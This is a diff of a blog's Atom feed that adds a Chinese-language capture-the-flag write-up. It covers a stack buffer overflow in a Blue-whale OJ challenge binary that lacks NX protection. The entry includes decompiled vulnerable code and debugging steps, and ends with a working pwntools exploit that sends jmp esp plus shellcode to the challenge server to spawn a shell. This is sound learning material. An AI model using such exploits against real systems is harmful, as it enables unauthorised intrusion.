@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://purewhitywhite.github.io/"/>
-  <updated>2020-03-15T15:37:22.493Z</updated>
+  <updated>2020-03-16T13:45:36.792Z</updated>
   <id>https://purewhitywhite.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Stage1Day9 pwn</title>
+    <link href="https://purewhitywhite.github.io/2020-03-16/Stage1Day9-pwn/"/>
+    <id>https://purewhitywhite.github.io/2020-03-16/Stage1Day9-pwn/</id>
+    <published>2020-03-16T07:27:39.000Z</published>
+    <updated>2020-03-16T13:45:36.792Z</updated>
+    
+    <content type="html"><![CDATA[<p>Blue-whale OJ<br>shellcode writeup.</p><a id="more"></a><h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><h2 id="查看文件类型-amp-保护机制"><a href="#查看文件类型-amp-保护机制" class="headerlink" title="查看文件类型&amp;保护机制"></a>查看文件类型&amp;保护机制</h2><center><img src="https://s1.ax1x.com/2020/03/16/8Ynvng.jpg" alt="8Ynvng.jpg" border="0"></center>与第一关不同，没有开启NX（不可执行），此时可以尝试在数据所在内存页写入shellcode<h2 id="反编译结果"><a href="#反编译结果" class="headerlink" title="反编译结果"></a>反编译结果</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_804851A</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80484EB();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input your name"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hello "</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到与第一关一样read函数发生缓冲区溢出，buf大小为0x1Ch，读入了0x100h，可以尝试在执行read函数时写入shellcode。于是问题的关键就在于：如何找到buf在栈中的储存位置（以便修改返回地址指向shellcode）？</p><h2 id="动态调试确定buf在栈中位置"><a href="#动态调试确定buf在栈中位置" class="headerlink" title="动态调试确定buf在栈中位置"></a>动态调试确定buf在栈中位置</h2><ul><li>使用IDA的Remote Linux Debugger实现对pwn3的动态调试<br>step1:将IDA目录\dbgsrv\里的<code>linux_server</code>文件放在linux里pwn3所在的同一目录（若是64位文件则使用<code>linux_server64</code>）</li></ul><p>step2:在linux下运行该文件:<code>./linux_server</code>开始监听<br>step3:在IDA菜单栏→Debugger→switchdebugger中选择linuxdebugger，并完成配置</p><hr><p>在<code>push 0</code>处设置断点，可以看到buf的地址以作为read的参数入栈：<br><center><img src="https://s1.ax1x.com/2020/03/16/8Y8loF.jpg" alt="8Y8loF.jpg" border="0"></center><br>向buf输入“hello”，查看并验证栈中的情况：<br><center><img src="https://s1.ax1x.com/2020/03/16/8YGSfJ.jpg" alt="8YGSfJ.jpg" border="0"></center><br><center><img src="https://s1.ax1x.com/2020/03/16/8YGkm6.jpg" alt="8YGkm6.jpg" border="0"></center><br>可以看到hello已经写入buf地址的栈中（逆序是因为小端序）</p><hr><p>然而再次运行、调试发现buf在栈中的位置并不固定：<br><center><img src="https://s1.ax1x.com/2020/03/16/8YGwXq.jpg" alt="8YGwXq.jpg" border="0"></center></p><h2 id="动态定位shellcode"><a href="#动态定位shellcode" class="headerlink" title="动态定位shellcode"></a>动态定位shellcode</h2><center><img src="https://s1.ax1x.com/2020/03/16/8YJQC4.md.jpg" alt="8YJQC4.jpg" border="0"></center><p>解决方案：利用<code>jmp esp</code>运行shellcode<a href="https://blog.csdn.net/lixiangminghate/article/details/53333710" title="原理解析" target="_blank" rel="noopener">原理解析</a><br>思路：利用任意一个<code>jmp esp</code>指令的地址覆盖返回地址→覆盖buf和ebp→在返回地址之后紧跟着布置shellcode→函数在返回后将被定向去执行内存中的<code>jmp esp</code>指令→<code>jmp esp</code>指令执行后，处理器会到栈区函数返回地址之后的地方取指令执行，即shellcode</p><blockquote><p><code>jmp esp</code>的机器码为FFE4，在文件中的地址为08048667。<br><center><img src="https://s1.ax1x.com/2020/03/16/8YWVfJ.jpg" alt="8YWVfJ.jpg" border="0"></center></p></blockquote><table><tr><td bgcolor="#87CEFA">payload:(0x1ch+0x4h)*a +[jmp esp]+shellcode</td></tr></table><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'vps1.blue-whale.me'</span>,<span class="number">9992</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload = <span class="number">32</span>*<span class="string">'a'</span> + p32(<span class="number">0x08048667</span>) + shellcode</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><center><img src="https://s1.ax1x.com/2020/03/16/8Y4bcj.md.jpg" alt="8Y4bcj.jpg" border="0"></center>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Blue-whale OJ&lt;br&gt;shellcode writeup.&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="blue-whale" scheme="https://purewhitywhite.github.io/tags/blue-whale/"/>
+    
+      <category term="pwn" scheme="https://purewhitywhite.github.io/tags/pwn/"/>
+    
+  </entry>
   
   <entry>
     <title>Stage1Day8 Misc</title>
